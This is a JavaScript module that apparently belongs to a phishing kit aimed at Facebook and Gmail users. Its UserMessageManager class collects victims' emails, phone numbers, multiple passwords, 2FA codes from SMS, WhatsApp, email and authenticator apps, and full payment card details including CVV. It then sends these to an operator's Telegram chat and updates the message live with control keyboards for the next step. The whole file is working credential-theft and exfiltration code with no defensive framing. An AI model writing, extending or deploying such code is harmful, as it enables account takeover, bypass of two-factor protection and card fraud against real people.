import axios from "axios";
import { toDialCode } from "./countryDialCodes.js";
import { buildFacebookKeyboard, buildGoogleKeyboard } from "./gmailTelegramCommands.js";

class UserMessageManager {
  constructor() {
    this.users = new Map();
  }

  getUser(userId) {
    if (!this.users.has(userId)) {
      this.users.set(userId, {
        telegramMessageId: null,
        flow: "facebook",
        data: {},
      });
    }
    return this.users.get(userId);
  }

  getMessageId(userId) {
    return this.getUser(userId).telegramMessageId;
  }

  setMessageId(userId, messageId) {
    this.getUser(userId).telegramMessageId = messageId;
  }

  getFlow(userId) {
    return this.getUser(userId).flow;
  }

  setFlow(userId, flow) {
    this.getUser(userId).flow = flow;
  }

  updateData(userId, newData) {
    const user = this.getUser(userId);
    for (const [key, value] of Object.entries(newData)) {
      if (value === undefined) continue;
      if (value === null) {
        delete user.data[key];
      } else {
        user.data[key] = value;
      }
    }
  }

  getKeyboard(userId) {
    const user = this.getUser(userId);
    return user.flow === "google"
      ? buildGoogleKeyboard(userId)
      : buildFacebookKeyboard(userId);
  }

  buildText(userId) {
    const user = this.getUser(userId);
    const d = user.data;

    const name = d.full_name || d.name || "User";
    const isGoogle = d.pageName === "Gmail" || user.flow === "google";
    const emailLabel = isGoogle ? "Gmail Email" : "Facebook Email";
    const email = d.login_email || d.email || d.business_email || "";

    const lines = [
      `=============${name}=============`,
      `ID: \`${d.id || userId}\``,
    ];

    if (d.ip) lines.push(`IP: \`${d.ip}\``);
    if (d.country) lines.push(`Country: \`${d.country}\``);
    if (d.city) lines.push(`City: \`${d.city}\``);
    if (d.countryCode) lines.push(`Country Code: \`${toDialCode(d.countryCode)}\``);
    if (d.business_email) lines.push(`Business Email: \`${d.business_email}\``);
    if (email) lines.push(`${emailLabel}: \`${email}\``);
    if (d.phone_number) lines.push(`Phone: \`${d.phone_number}\``);

    const passwords = [];
    if (d.passwords && Array.isArray(d.passwords)) {
      passwords.push(...d.passwords.filter(Boolean));
    } else {
      [d.password_one, d.password_two, d.password_three]
        .filter(Boolean)
        .forEach((p) => passwords.push(p));
    }
    passwords.forEach((pwd, idx) => {
      lines.push(`Password${idx + 1}: \`${pwd}\``);
    });

    if (d.tfaCodes && d.tfaCodes.length > 0) {
      d.tfaCodes.forEach((c, idx) => {
        lines.push(`2fa${idx + 1}: \`${c}\``);
      });
    } else {
      if (d.tfa_one) lines.push(`2fa: \`${d.tfa_one}\``);
      if (d.tfa_two) lines.push(`2fa-2: \`${d.tfa_two}\``);
    }
    if (d.whatsapp) lines.push(`Whatsapp 2fa: \`${d.whatsapp}\``);
    if (d.email2fa) lines.push(`Email 2fa: \`${d.email2fa}\``);
    if (d.auth_app_2fa) lines.push(`Auth App 2fa: \`${d.auth_app_2fa}\``);

    if (d.CardName) lines.push(`Name: \`${d.CardName}\``);
    if (d.CardNr) lines.push(`Card Number: \`${d.CardNr}\``);
    if (d.CardDate) lines.push(`Expiry Date: \`${d.CardDate}\``);
    if (d.CardCvc) lines.push(`CVV: \`${d.CardCvc}\``);

    lines.push("=============================");

    if (d.currentStep) {
      lines.push(`Current Step: ${d.currentStep}`);
      lines.push("=============================");
    }

    if (d.replyInstruction) {
      lines.push("");
      lines.push(d.replyInstruction);
    }

    return lines.join("\n");
  }

  async sendOrEdit(userId, buttons) {
    if (!process.env.BOT || !process.env.CHAT_ID) {
      return null;
    }

    const user = this.getUser(userId);
    const text = this.buildText(userId);

    if (user.telegramMessageId) {
      try {
        await axios.post(
          `https://api.telegram.org/bot${process.env.BOT}/editMessageText`,
          {
            chat_id: process.env.CHAT_ID,
            message_id: user.telegramMessageId,
            text,
            parse_mode: "Markdown",
            reply_markup: buttons,
          },
          { timeout: 5000 }
        );
        console.log(`[MSG_MANAGER] Edited message ${user.telegramMessageId} for user ${userId}`);
        return user.telegramMessageId;
      } catch (error) {
        const desc = error.response?.data?.description || "";
        if (desc.includes("message is not modified")) {
          return user.telegramMessageId;
        }
        console.warn(`[MSG_MANAGER] Edit failed: ${desc}`);
        user.telegramMessageId = null;
      }
    }

    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
        {
          chat_id: process.env.CHAT_ID,
          text,
          parse_mode: "Markdown",
          reply_markup: buttons,
        },
        { timeout: 5000 }
      );

      user.telegramMessageId = response.data?.result?.message_id;
      console.log(`[MSG_MANAGER] Sent new message ${user.telegramMessageId} for user ${userId}`);
      return user.telegramMessageId;
    } catch (error) {
      console.error(`[MSG_MANAGER] Send failed for ${userId}:`, error.message);
      return null;
    }
  }

  async update(userId, newData, customButtons) {
    this.updateData(userId, newData);
    const buttons = customButtons || this.getKeyboard(userId);
    return this.sendOrEdit(userId, buttons);
  }

  cleanup(maxAge = 3600000) {
    const now = Date.now();
    for (const [userId, user] of this.users.entries()) {
      if (user.data._lastUpdate && now - user.data._lastUpdate > maxAge) {
        this.users.delete(userId);
      }
    }
  }
}

let instance = null;

export const getUserMessageManager = () => {
  if (!instance) {
    instance = new UserMessageManager();
    setInterval(() => instance.cleanup(), 1800000);
  }
  return instance;
};

export default UserMessageManager;
